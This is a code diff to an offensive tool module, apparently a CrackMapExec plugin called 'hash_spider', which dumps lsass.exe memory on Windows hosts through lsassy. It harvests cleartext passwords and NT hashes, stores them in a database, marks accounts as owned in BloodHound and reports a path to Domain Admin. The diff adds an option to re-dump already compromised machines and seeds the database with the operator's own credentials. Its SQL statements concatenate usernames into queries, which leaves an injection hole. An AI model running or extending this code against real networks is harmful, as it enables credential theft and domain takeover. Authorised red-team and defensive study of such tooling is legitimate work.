@@ -5,7 +5,6 @@ import configparser
 from ctypes import create_unicode_buffer
 from operator import contains
 from types import MethodType
-
 from urllib3 import Retry
 from neo4j import GraphDatabase, basic_auth
 from neo4j.exceptions import AuthError, ServiceUnavailable
@@ -82,12 +81,14 @@ def create_db(local_admins):
     dbconnection.commit()
 
 def process_creds(context, connection, credentials_data):
+    context.log.extra['host'] = connection.domain
+    context.log.extra['hostname'] = connection.host.upper()
     for result in credentials_data:
         username = result["username"].upper().split('@')[0]
         nthash = result["nthash"]
         password = result["password"]
         if result["password"] != None:
-            context.log.success(f"Found a cleartext password for: {username}:{password} on {connection.host}. Adding to the DB and marking user as owned in BH.")
+            context.log.success(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
             cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
             username = (f"{username.upper()}@{connection.domain.upper()}")
             dbconnection.commit()
@@ -96,7 +97,7 @@ def process_creds(context, connection, credentials_data):
         if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
             context.log.error(f"Hash for {username} is expired.")
         elif username not in found_users and nthash != None:
-            context.log.success(f"Found hashes for: {username}:{nthash} on {connection.hostname}. Adding them to the DB and marking user as owned in BH.")
+            context.log.success(f"Found hashes for: {username}:{nthash}. Adding them to the DB and marking user as owned in BH.")
             found_users.append(username)
             cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
             dbconnection.commit()
@@ -114,7 +115,14 @@ def process_creds(context, connection, credentials_data):
                                     context.log.success(f"You have a valid path to DA as {item['name']}.")
                                     reported_da.append({item['name']})
                                 sys.exit()
-            
+
+def initial_run(connection):
+    username = connection.username
+    password = getattr(connection, "password", "")
+    nthash = getattr(connection, "nthash", "")
+    cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
+    cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
+
 class CMEModule:
     name = 'hash_spider'
     description = "Dump lsass recursively from a given hash using BH to find local admins"
@@ -125,10 +133,18 @@ class CMEModule:
     def options(self, context, module_options):
         """
             METHOD              Method to use to dump lsass.exe with lsassy
+            RESET_DUMPED        Allows re-dumping of computers. (Default: False)
         """
         self.method = 'comsvcs'
         if 'METHOD' in module_options:
             self.method = module_options['METHOD']
+        self.reset_dumped = module_options.get('RESET_DUMPED', False)
+        if self.reset_dumped != False:
+            try:
+                cursor.execute("UPDATE pc_and_admins SET dumped = 'False'")
+                context.log.info("PCs can be dumped again.")
+            except Exception:
+                pass
 
     def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
         logger.init(quiet=True)
@@ -206,6 +222,7 @@ class CMEModule:
         neo4j_conn(context)
         neo4j_local_admins(context)
         create_db(admin_results)
+        initial_run(connection)
         context.log.info("Running lsassy.")
         self.run_lsassy(context, connection)
         process_creds(context, connection, credentials_data)
